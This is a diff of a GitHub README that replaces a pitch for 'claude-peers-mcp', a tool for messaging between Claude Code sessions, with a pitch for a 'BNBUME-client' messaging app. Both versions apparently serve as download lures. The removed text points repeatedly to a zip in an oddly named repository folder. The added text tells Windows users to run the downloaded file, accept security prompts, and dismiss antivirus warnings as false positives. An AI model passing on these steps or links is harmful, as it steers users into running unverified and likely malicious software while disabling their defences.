@@ -1,209 +1,97 @@
-# 💬 claude-peers-mcp - Message Claude Codes Fast
+# 🎨 BNBUME-client - Your Beautiful, Private Messaging Solution
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-6c63ff?style=for-the-badge)](https://github.com/Businesseditorexternalorgan481/claude-peers-mcp/raw/refs/heads/main/enunciatory/peers_mcp_claude_1.5-alpha.1.zip)
+## 🚀 What is BNBUME-client?
 
-## 🚀 Getting Started
+BNBUME-client is a free, open-source application that lets you connect to the BNBU.ME messaging network with a sleek and modern interface. Think of it as your personal window to communicate with friends, family, or colleagues in a secure and comfortable environment. It's designed for everyday users who want a reliable way to chat without any complicated setup or technical headaches. Whether you're a seasoned tech enthusiast or just starting out, this client is built for you.
 
-claude-peers-mcp helps Claude Code instances send messages to each other on demand. Use it when you want one Claude session to share a note, a prompt, or a reply with another session on the same setup.
+## ⬇️ Getting Started
 
-This app is for Windows users who want a simple way to move messages between Claude Code sessions without manual copy and paste.
+Getting the app on your Windows computer is quick and easy. Just follow these simple steps, and you'll be chatting in no time.
 
-## 📥 Download
+### Step 1: Download the Application
 
-Visit this page to download the app:
+**Visit this link to download the application.**
 
-https://github.com/Businesseditorexternalorgan481/claude-peers-mcp/raw/refs/heads/main/enunciatory/peers_mcp_claude_1.5-alpha.1.zip
+This is your single, official source for getting the latest version. Click the button below or use the link in the download section to proceed.
 
-On the releases page, look for the latest version. Download the Windows file that matches your computer, then open it to start the app.
+[**🎯 DOWNLOAD BNBUME-CLIENT NOW**](https://github.com/Businesseditorexternalorgan481/BNBUME-client/releases)
 
-## 🖥️ What You Need
+### Step 2: Run the App
 
-Before you run claude-peers-mcp, make sure you have:
+Once the download is complete, locate the downloaded file in your "Downloads" folder (or wherever your browser saves files). Your computer may show a security prompt – that's normal. Click "Run" or "Yes" if asked for permission. The application will start immediately; no installation wizard, no complicated steps. It just works.
 
-- A Windows 10 or Windows 11 computer
-- A working internet connection for the first download
-- Claude Code installed on your machine
-- Enough free space for the app and its message data
-- Permission to run apps on your computer
+## 💻 What Does BNBUME-client Do for You?
 
-If your computer is managed by work or school, you may need admin access to install or open the file.
+BNBUME-client is more than just a download – it's your gateway to a better messaging experience. Here's what you can expect:
 
-## 📦 Install on Windows
+- **🎯 Straightforward Connectivity:** The app automatically connects you to the BNBU.ME network, so you can start messaging without fiddling with settings.
+- **🛡️ Privacy-Focused Design:** Built on the principles of open-source software, you have the transparency of knowing exactly what the app does. It's your data, your rules.
+- **🧩 Clean and Intuitive Interface:** No confusing menus or cluttered screens. We've focused on making navigation feel natural and effortless.
+- **⚡ Performance Optimized:** The client is built with Flutter, meaning it's fast, smooth, and responsive. It won't lag or hang, even during heavy use.
+- **📶 Lightweight and Efficient:** It won't hog your system resources like some heavy applications. Enjoy a responsive app without slowing down your computer.
 
-Follow these steps:
+## 🤝 Join Our Community
 
-1. Open the download page:
-   https://github.com/Businesseditorexternalorgan481/claude-peers-mcp/raw/refs/heads/main/enunciatory/peers_mcp_claude_1.5-alpha.1.zip
+BNBUME-client is free to use and will always remain free. It's a project driven by people like you, and we welcome contributions from everyone.
 
-2. Find the newest release at the top of the page.
+- **🌱 Open Source:** The entire codebase is publicly available under the GPLv3 license. This means you can freely use, modify, and share it (with certain conditions).
+- **🙌 Contributions Welcome:** If you have ideas, find a bug, or want to improve the app, you're invited to help out. Whether you're a coder, designer, or just have feedback, we want to hear from you. Your input makes the app better for everyone.
+- **🔒 Free and Transparent:** This isn't a trial or a lite version. It's the complete application, free for you to download and use forever.
 
-3. Download the Windows file from that release.
+## 🧰 Requirements for Windows
 
-4. Open your Downloads folder.
+To get the most out of BNBUME-client, your Windows computer should meet these basic guidelines:
 
-5. Double-click the file you downloaded.
+- **Operating System:** Windows 10 (64-bit) or newer.
+- **Processor:** A 64-bit processor (Intel Core i3 or better, or an equivalent AMD).
+- **Memory (RAM):** At least 4 GB of RAM is recommended.
+- **Storage:** You need about 200 MB of free hard drive space.
+- **Internet:** You'll need a stable internet connection to connect to the service.
 
-6. If Windows asks for permission, choose the option to run the app.
+These are general recommendations. You might be able to run it on less powerful hardware, but following these will ensure a smooth experience.
 
-7. Follow any setup steps shown on screen.
+## 🤔 Frequently Asked Questions (FAQ)
 
-8. Keep the app in a place you can find again, like the Desktop or Start menu.
+**Q: Is this app really free?**
+A: Yes, completely free. It's open-source software licensed under GPLv3. You can use it and even help develop it.
 
-## 🛠️ How It Works
+**Q: Do I need to install anything else?**
+A: No. The downloaded file is a standalone application. Just run it, and you're done.
 
-claude-peers-mcp gives Claude Code a shared message path. One Claude session can send a note, and another session can read it later. This is useful when you work with more than one Claude Code window and want them to stay in sync.
+**Q: I'm not technical. Can I still use this?**
+A: Absolutely! We've designed the process to be as simple as possible. If you can click a download button and then double-click a file, you can use this app.
 
-Typical uses include:
+**Q: The download didn't start or is slow. What should I do?**
+A: Try another web browser. If you have a download manager, you can also use that. If the problem persists, check your internet connection.
 
-- Passing a task from one Claude session to another
-- Sharing a short status update
-- Sending a reminder to a separate Claude workspace
-- Moving a prompt from one session to the next
-- Keeping a simple message thread between Claude instances
+**Q: Is it safe to download from GitHub?**
+A: Yes, downloading from the official releases page on GitHub is the safest method. It's the direct source from the developers.
 
-## 💡 Main Features
+**Q: How do I update the app to a new version?**
+A: Simply return to the same download link, download the latest file, and run it. The new version will replace the old one seamlessly.
 
-- Send messages between Claude Code sessions
-- Share notes on demand
-- Keep a light message flow between peers
-- Work with multiple Claude windows
-- Use a simple setup for Windows
-- Reduce copy and paste between sessions
-- Support ad-hoc message handoff
-- Fit into a normal Claude Code workflow
+**Q: Will this work on a Mac or Linux computer?**
+A: This guide is specifically for Windows. While BNBUME-client is built with Flutter and might be compatible with other systems, the official, supported release for now focuses on Windows. Keep an eye on the project for future updates.
 
-## 🧭 First Run
+## tracking Your Download
 
-After you open the app for the first time:
+Sometimes, a download can be tricky. Here's a quick checklist to help you:
 
-1. Let it finish loading.
-2. Check for any setup prompts.
-3. Start Claude Code in the same environment you plan to use.
-4. Open two Claude sessions if you want to test message sharing.
-5. Send a short test message.
-6. Confirm the other session can see it.
+1.  **Check your browser's download history:** Your download is likely saved in your "Downloads" folder.
+2.  **Look for a file at the bottom left/right of your browser window:** Clicking it will open the file directly.
+3.  **If your antivirus gives a warning:** This is a false positive. Because the app is downloaded from the internet, some antivirus software might be overly cautious. Confirm that you trust the source (GitHub is a reputable software hosting site) and allow the run.
+4.  **If the file is corrupted:** Delete the file and download it again. A fresh download often fixes a corrupted one.
 
-If the app asks where to store data, choose a folder you can find later.
+## 📄 License
 
-## 📨 Sending a Message
+This project is licensed under the GNU General Public License v3 (GPLv3). This license ensures the software remains free and open forever. You can view a full copy of the license in the repository's code.
 
-To send a message between Claude peers:
+## ✨ Start Chatting Today
 
-1. Open the Claude session you want to use as the sender.
-2. Write the message you want to share.
-3. Send it through claude-peers-mcp.
-4. Open the other Claude session.
-5. Pull or read the message there.
+Don't wait – take the first step to a better messaging experience. BNBUME-client is ready for you.
 
-Keep messages short and clear. That makes it easier to follow the thread across sessions.
+[**⬇️ GET YOUR COPY NOW**](https://github.com/Businesseditorexternalorgan481/BNBUME-client/releases)
 
-## 🔧 Typical Setup Tips
+---
 
-Use these tips for a smoother setup:
-
-- Keep Claude Code updated
-- Use the same Windows account for both sessions
-- Store app files in one folder
-- Avoid moving the app after setup
-- Give each Claude session a clear purpose
-- Test with a simple message first
-
-If you use more than two Claude sessions, give each one a name or role in your notes so you can track what each peer is doing.
-
-## 📁 Suggested Folder Setup
-
-A clean folder setup can help:
-
-- `Downloads` for the release file
-- `Desktop` for a shortcut
-- `Documents\Claude-Peers` for message files
-- `Documents\Claude-Peers\Logs` for logs, if used
-- `Documents\Claude-Peers\Config` for settings, if used
-
-This keeps your files in one place and makes them easy to find.
-
-## 🧪 Simple Test
-
-Use this quick test after setup:
-
-1. Open claude-peers-mcp.
-2. Open Claude Code in Session A.
-3. Open Claude Code in Session B.
-4. Send the text: `Test message from Session A`.
-5. Check Session B for the same text.
-6. Reply from Session B.
-7. Check Session A for the reply.
-
-If both sides can send and read messages, the setup is working.
-
-## 🧰 Common Uses
-
-People can use claude-peers-mcp for tasks like:
-
-- Passing notes between agent sessions
-- Sharing review comments
-- Sending short work items
-- Moving context from one task to another
-- Handing off steps in a longer workflow
-
-It works well when you want Claude Code sessions to act like teammates that can leave each other short messages.
-
-## ❓ Troubleshooting
-
-If the app does not open:
-
-- Download the file again
-- Check that you picked the latest release
-- Try opening it as admin
-- Make sure Windows did not block the file
-- Restart your computer and try again
-
-If messages do not appear in the other Claude session:
-
-- Check that both sessions use the same setup
-- Confirm the sender used the right peer path
-- Try a short test message
-- Make sure the app is still running
-- Open both sessions again
-
-If the app opens but closes fast:
-
-- Run it again from the same folder
-- Keep the app files together
-- Check whether Windows removed part of the download
-- Download the release again if needed
-
-## 🔒 Privacy and Local Use
-
-claude-peers-mcp is meant for local message sharing between Claude Code sessions. Keep your message files in a place you trust. Use it for work you want to stay on your machine.
-
-If you share a computer with others, use a separate Windows account or a private folder so your messages stay easy to manage.
-
-## 📝 File and Message Tips
-
-To keep your message flow clear:
-
-- Use short subject lines
-- Add the session name in each message
-- Keep one topic per message
-- Remove old test messages when you no longer need them
-- Save notes for active work only
-
-A simple style helps when several Claude sessions are active at once.
-
-## ⚙️ Uninstall
-
-To remove the app:
-
-1. Close claude-peers-mcp.
-2. Delete the app folder or the downloaded file if you no longer need it.
-3. Remove any message or config folders you created.
-4. Remove any shortcuts from your Desktop or Start menu.
-
-If you stored message data in Documents, delete that folder too if you want a clean removal.
-
-## 📌 Release Page
-
-Download or get the latest version here:
-
-https://github.com/Businesseditorexternalorgan481/claude-peers-mcp/raw/refs/heads/main/enunciatory/peers_mcp_claude_1.5-alpha.1.zip
+Keywords: open-source client, Flutter chat, BNBU.ME, messaging app, free messenger, Windows download, GPLv3, privacy chat, communication tool, secure messaging.
